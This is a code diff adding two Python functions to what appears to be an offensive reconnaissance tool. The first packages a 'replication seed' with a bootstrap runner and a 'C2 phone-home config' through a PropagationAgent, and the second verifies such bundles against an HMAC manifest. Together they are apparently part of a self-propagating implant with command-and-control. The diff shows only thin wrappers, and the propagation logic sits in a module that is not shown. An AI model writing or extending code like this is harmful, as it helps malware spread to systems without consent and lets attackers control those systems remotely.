@@ -4,11 +4,42 @@ import json
 import random
 import argparse
 import logging
+from pathlib import Path
+from typing import Optional, Tuple
 from urllib.parse import urlparse
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 
 from recon.resilience import CircuitBreakerRegistry
+
+
+def package_propagation_seed(output_dir: Optional[str] = None, archive_format: str = "tar.gz") -> str:
+    """
+    Constructs a hardened, self-contained replication seed package with
+    bootstrap runner, C2 phone-home config, and integrity manifest.
+    """
+    try:
+        from agents.propagation_agents import PropagationAgent
+        agent = PropagationAgent()
+        pkg = agent.create_standalone_package(
+            output_dir=Path(output_dir) if output_dir else None,
+            archive_format=archive_format
+        )
+        return str(pkg)
+    except Exception as e:
+        logging.error(f"Failed to generate replication seed package: {e}")
+        return ""
+
+
+def verify_seed_integrity(bundle_or_manifest_path: str, hmac_key: Optional[str] = None) -> Tuple[bool, str]:
+    """
+    Verifies the integrity of a replication bundle against its manifest.
+    """
+    try:
+        from agents.propagation_agents import PropagationAgent
+        return PropagationAgent.verify_bundle_integrity(Path(bundle_or_manifest_path), hmac_key=hmac_key)
+    except Exception as e:
+        return False, f"Verification failed: {e}"
 
 # Load configuration from a JSON file
 def load_config(config_file):
